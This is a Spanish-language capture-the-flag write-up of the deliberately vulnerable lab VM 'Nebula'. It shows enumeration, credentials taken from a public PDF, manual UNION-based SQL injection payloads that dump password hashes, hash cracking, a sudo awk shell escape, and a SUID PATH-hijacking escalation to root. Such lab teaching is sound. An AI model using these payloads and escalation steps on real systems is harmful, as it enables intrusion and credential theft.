---
title: "🖥️ Máquina: Nebula — Hacking Ético"
aliases:
  - Nebula
  - nebula
  - Máquina Nebula
  - VM Nebula
  - Writeup Nebula
tags:
  - ifct0109
  - hacking-etico
  - vms
  - vulnerabilidades-web
  - linux
  - ctf
---

# 🖥️ Máquina: Nebula

> [!abstract] Ficha Técnica del Laboratorio
> **Sistema Operativo:** Linux  
> **Categoría:** Vulnerabilidades Web  
> **Técnicas trabajadas:** Enumeración web · Credenciales en PDF · SQL Injection manual · Cracking de hashes · Movimiento lateral (sudo + awk) · Escalada de privilegios (SUID + PATH Hijacking)  
> **Descripción:** En esta práctica encontraremos credenciales en un PDF público, accederemos a un panel de administración y explotaremos una SQL Injection manual para extraer hashes de usuarios. Tras crackear el hash accederemos por SSH, nos moveremos lateralmente mediante sudo con awk y escalaremos a root explotando un binario SUID mediante PATH Hijacking.  
> 
> 🔗 **Navegación:** [[02 - MODULOS/Hacking Ético/03 - Máquinas Hackeables (VMs)|⬅️ Catálogo de Máquinas Hackeables]] &emsp;|&emsp; [[02 - MODULOS/04 - Hacking Ético|🧪 Hacking Ético]] &emsp;|&emsp; [[00 - INDICE|🏠 Inicio]]

---

## ⚙️ Configuración del Entorno de Red

Para ejecutar los comandos en tu laboratorio local (Red NAT):

* **`LHOST` (Atacante / Kali Linux):** Ej. `10.0.0.5`
* **`RHOST` (Víctima / Nebula):** Ej. `10.0.0.12`

> [!tip] Detección Previa de IP Víctima
> Si no conoces la IP asignada a la máquina Nebula tras encenderla, ejecuta en Kali:
> ```bash
> sudo netdiscover -r 10.0.0.0/24
> ```

---

## 🔎 Fase 1: Enumeración de servicios

Comenzamos escaneando los puertos:

```bash
nmap -sT -p- 10.0.0.12
```

```text
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Revisamos los servicios:

```bash
nmap -A -p 21,80 10.0.0.12
```

```text
PORT   STATE    SERVICE VERSION
21/tcp filtered ftp
80/tcp open     http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Nebula Lexus Labs
|_http-server-header: Apache/2.4.41 (Ubuntu)
```

Vemos la tecnología de la web:

```bash
whatweb http://10.0.0.12
```

```text
http://10.0.0.12 [200 OK] Apache[2.4.41], Bootstrap, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], Title[Nebula Lexus Labs]
```

Y alguna primera vulnerabilidad:

```bash
nikto -h http://10.0.0.12
```

```text
- Nikto v2.5.0
+ Server: Apache/2.4.41 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present.
+ Apache/2.4.41 appears to be outdated (current is at least Apache/2.4.54).
+ /img/: Directory indexing found.
+ /login/: Cookie PHPSESSID created without the httponly flag.
+ /login/: This might be interesting.
+ 8074 requests: 0 error(s) and 8 item(s) reported on remote host
```

> [!info] Resultado
> Algún directorio interesante. Seguimos enumerando con gobuster:

---

## 🌐 Fase 2: Enumeración web — PDF con credenciales

```bash
gobuster dir -r -u http://10.0.0.12 -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
```

```text
/img     (Status: 200) [Size: 1118]
/login   (Status: 200) [Size: 1551]
/joinus  (Status: 200) [Size: 1712]
```

> [!info] Resultado
> Dos recursos interesantes en login y en joinus. Visitamos:
> · http://10.0.0.12/login/ → hay un formulario de usuario y contraseña.
> · http://10.0.0.12/joinus/ → hay una web con instrucciones y un enlace a un documento PDF.
> Abrimos el PDF:
> http://10.0.0.12/joinus/application_form.pdf
> Dentro del PDF hay unas instrucciones con lo que podrían ser unas credenciales:

```text
The link will be like:
https://nebulalabs.org/meetings?user=admin&password=d46df8e6a5627debf930f7b5c8f3b083
```

> [!info] Resultado
> Credenciales encontradas: admin:d46df8e6a5627debf930f7b5c8f3b083
> Probando las credenciales en http://10.0.0.12/login/ funcionan. Tenemos acceso a un dashboard. En meeting room no hay nada. Investigamos el apartado search_central:

---

## 💉 Fase 3: SQL Injection manual

Accedemos a http://10.0.0.12/login/search_central.php. Vamos probando primero para ver cómo funciona:

> [!info] Resultado
> Introducimos un 1 en el cuadro Central ID: y nos aparece la id 1. En la dirección aparece de la siguiente forma: http://10.0.0.12/login/search_central.php?id=1. Parece que hace una consulta y muestra los datos en una tabla de 3 columnas. Si ponemos otras ids como 2, 3, 4 vemos que de momento sólo aparecen resultados en 1 y en 2. Vamos a probar SQL injection para acceder a toda la info.

Probamos el siguiente payload:

```bash
1' or '0'='0
```

> [!info] Resultado
> Muestra todos los datos. Confirmada la inyección SQL. Vamos ahora a investigar las tablas. Primero comprobamos cuántas columnas disponemos:

```bash
cn' UNION select 1,2,3-- -
```

```text
id	role	username
1	2	3
```

> [!info] Resultado
> Tenemos 3 columnas: id, role y username. Extraemos la información de toda la base de datos:

```bash
cn' UNION  SELECT schema_name, NULL, NULL from INFORMATION_SCHEMA.SCHEMATA; -- -
```

```text
id
information_schema
nebuladb
```

> [!info] Resultado
> Muestra que hay una base de datos llamada nebuladb. Ahora podemos mostrar todas las tablas. Podemos mostrarlas todas o filtrar sólo las de nebuladb:

```bash
cn' UNION  SELECT table_name, NULL, NULL from information_schema.tables; -- -
```

```bash
' UNION SELECT table_name, NULL, NULL FROM information_schema.tables WHERE table_schema = 'nebuladb'; -- -
```

> [!info] Resultado
> Una vez conocemos las tablas de nebuladb vamos a ver el contenido de la tabla users:

```bash
cn' UNION  SELECT column_name, NULL, NULL from information_schema.columns WHERE table_name = 'users'; -- -
```

```text
id
username
password
is_admin
```

> [!info] Resultado
> Muestra que la tabla tiene 4 campos. Ahora vamos a ver el contenido de los campos username, password y is_admin:

```bash
cn' UNION  SELECT username, password, is_admin from users-- -
```

```text
admin        d46df8e6a5627debf930f7b5c8f3b083  1
pmccentral   c8c605999f3d8352d7bb792cf3fdb25b  1
```

> [!info] Resultado
> Hay dos usuarios con privilegios admin: admin y pmccentral, con sus respectivos hashes. Podemos ver también otras tablas:

```bash
cn' UNION  SELECT column_name, NULL, NULL from information_schema.columns WHERE table_name = 'centrals'; -- -
```

```bash
cn' UNION  SELECT userssh, passwordssh, role from centrals-- -
```

> [!info] Resultado
> Vamos a crackstation.net y pegamos ambos hashes. Obtenemos la contraseña del usuario pmccentral:
> Hash: c8c605999f3d8352d7bb792cf3fdb25b
> Password: 999999999

```bash
sqlmap -u
```

---

## 🔑 Fase 4: Acceso SSH y movimiento lateral con awk

Vamos a ver si podemos entrar por SSH con el usuario y la contraseña que tenemos:

```bash
ssh pmccentral@10.0.0.12
```

```text
pmccentral@10.0.0.12's password: 999999999
```

Una vez dentro vamos enumerando para intentar elevar privilegios o movernos a otro usuario:

```bash
sudo -l
```

```text
User pmccentral may run the following commands on laboratoryuser:
    (laboratoryadmin) /usr/bin/awk
```

> [!info] Resultado
> Podemos hacer un movimiento lateral al usuario laboratoryadmin. Según GTFOBins el comando es: sudo awk 'BEGIN {system("/bin/sh")}'. Por lo que ejecutamos:

```bash
sudo -u laboratoryadmin awk 'BEGIN {system("/bin/bash")}'
```

```text
laboratoryadmin@laboratoryuser:/home/pmccentral$
```

Ahora somos el otro usuario:

```bash
id
```

```text
uid=1002(laboratoryadmin) gid=1002(laboratoryadmin) groups=1002(laboratoryadmin)
```

Leemos la bandera:

```bash
cd
```

```bash
ls -la
```

```bash
cat user.txt
```

```text
flag{$udOeR$_Pr!V11E9E_I5_7En53}
```

> [!info] Resultado
> Flag de usuario obtenida: flag{$udOeR$_Pr!V11E9E_I5_7En53}

---

## 🚀 Fase 5: Escalada de privilegios — SUID + PATH Hijacking

Lo siguiente ahora es elevar privilegios:

```bash
find / -perm -4000 2>/dev/null
```

```text
/home/laboratoryadmin/autoScripts/PMCEmployees
```

> [!info] Resultado
> Revela la ejecución de un archivo. Vemos sus permisos:

```bash
ls -l /home/laboratoryadmin/autoScripts/PMCEmployees
```

```text
-rwsr-xr-x 1 root root 16792 Dec 17  2023 /home/laboratoryadmin/autoScripts/PMCEmployees
```

> [!info] Resultado
> Confirmamos que tiene el permiso SUID por lo que podríamos tratarlo de explotar para convertirnos en root. Vemos el tipo de archivo:

```bash
file /home/laboratoryadmin/autoScripts/PMCEmployees
```

```text
/home/laboratoryadmin/autoScripts/PMCEmployees: setuid ELF 64-bit LSB shared object, x86-64,
dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, not stripped
```

> [!info] Resultado
> Es un binario. Vamos a ver si podemos ver cadenas que nos den pistas de alguna ejecución interna:

```bash
strings /home/laboratoryadmin/autoScripts/PMCEmployees
```

> [!info] Resultado
> Hay una ejecución de un comando con ruta relativa, lo que nos permite aplicar PATH Hijacking:

```text
head /home/pmccentral/documents/employees.txt
```

> [!info] Resultado
> El binario llama a head sin ruta absoluta. Si creamos un head malicioso en /tmp y añadimos ese directorio al principio del PATH, el sistema encontrará nuestro head antes que el real, ejecutándolo con los privilegios SUID del binario (root):

```bash
cd /tmp
```

```bash
echo "/bin/bash" > head
```

```bash
chmod +x head
```

```bash
export PATH=/tmp:$PATH
```

Y una vez tenemos nuestro head malicioso ejecutamos el programa:

```bash
/home/laboratoryadmin/autoScripts/PMCEmployees
```

> [!info] Resultado
> Y ya tenemos el root:

```bash
id
```

```text
uid=0(root) gid=1002(laboratoryadmin) groups=1002(laboratoryadmin)
```

Capturamos su bandera:

```bash
cd /root
```

```bash
ls -la
```

```bash
cat root.txt
```

```text
flag{r00t_t3ns0}
```

> [!info] Resultado
> Flag de root obtenida: flag{r00t_t3ns0}

---

> [!note] 🔗 Enlaces Relacionados
> * 💻 [[02 - MODULOS/Hacking Ético/03 - Máquinas Hackeables (VMs)|Volver al Catálogo de Máquinas Hackeables]]
> * 🌐 [[02 - MODULOS/Hacking Ético/01 - Web Fuzzing|Guía de Web Fuzzing]]
> * 🔍 [[02 - MODULOS/Hacking Ético/02 - Reconocimiento Bug Bounty|Metodología de Reconocimiento]]
